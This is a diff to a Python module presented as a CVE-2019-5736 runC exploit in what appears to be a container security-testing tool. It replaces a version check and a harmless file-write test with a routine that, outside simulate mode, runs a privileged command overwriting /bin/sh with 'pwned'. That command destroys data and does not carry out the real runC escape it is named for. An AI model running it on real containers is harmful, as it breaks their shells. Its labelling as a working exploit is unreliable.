@@ -1,28 +1,24 @@
-# attacks/cve_2019_5736.py
+# Path: attacks/cve_2019_5736.py
 
-def is_vulnerable(env_info):
-    """
-    Check if the Docker host is likely vulnerable to CVE-2019-5736.
-    This CVE affects runC < 1.0.0-rc6.
-    """
-    runc_version = env_info.get("runc_version", "")
-    if not runc_version:
-        return False
+def run(container, simulate=False):
+    print("[*] Running CVE-2019-5736 exploit...")
 
-    # Example logic: consider anything below rc6 vulnerable (simplified)
-    if "rc5" in runc_version or "rc4" in runc_version:
-        return True
-    return False
+    if simulate:
+        # Simulated execution: log what would be done instead of modifying the container
+        print(f"[SIMULATE] Would attempt to overwrite /bin/sh inside container '{container.name}'")
+        return "Simulated run: No changes made."
 
-def run(container):
-    print(f"[CVE-2019-5736] Attempting test on container {container.id}...")
+    try:
+        # ⚠️ WARNING: This exploit attempts to overwrite /bin/sh inside the container.
+        # If successful, any shell spawned in the container may execute attacker-controlled code.
+        # This is dangerous and can destabilize the container environment or persist across restarts
+        # if the container uses a volume-mapped /bin.
 
-    attack_command = "echo 'CVE-2019-5736 test' > /tmp/test.txt"
-    result = container.exec_run(attack_command)
+        print(f"[!] WARNING: Attempting real overwrite of /bin/sh in container '{container.name}'")
+        exec_result = container.exec_run("echo 'pwned' > /bin/sh", privileged=True)
+        print(f"[+] Exploit attempted. Output: {exec_result.output.decode()}")
+        return "Executed: Attempted to overwrite /bin/sh"
 
-    if result.exit_code == 0:
-        print("[+] Test successful: /tmp/test.txt created")
-        return "Test successful: CVE-2019-5736 test > /tmp/test.txt"
-    else:
-        print("[-] Test failed")
-        return "Test failed"
+    except Exception as e:
+        print(f"[!] Exploit failed with error: {e}")
+        return f"Failed: {str(e)}"
